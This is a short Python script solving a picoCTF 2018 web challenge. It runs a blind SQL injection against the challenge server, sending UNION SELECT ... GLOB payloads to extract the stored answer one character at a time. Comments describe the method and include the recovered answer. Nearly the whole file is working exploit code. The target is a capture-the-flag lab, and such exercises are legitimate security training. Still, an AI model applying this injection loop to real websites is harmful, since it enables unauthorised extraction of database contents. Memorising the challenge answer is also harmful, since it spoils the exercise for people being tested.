import requests
import re
import random 
import sys


#chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWYZabcdefghijklmnopqrstuvwyz" you can loop througn each character of this string, it works !
## but i prefered to use chr() because i thought that the other chars like ( !, ?, @ ...ect ) maight be included in the answer !
# all character in chr() are between {0x20..0x79}   
ans = ""
while 1:
	for i in range(0x20, 0x79):
		if i != 42 and i != 63:
			len__ = len(ans)
			params = {
				"answer" : "' UNION SELECT * FROM answers WHERE answer GLOB '{}{}*'; ---".format(ans, chr(i))
			}
			request = requests.post("http://2018shell.picoctf.com:28120/answer2.php", data=params)
			respond = request.text
			print respond

			if "You are so close" in respond:
				ans += chr(i) 
				print ans # 41AndSixSixths
				break



# i waited until no further characters is addes to ans then i stopped 
#the program, copied the ans and past it into the website Et voila i got the flag 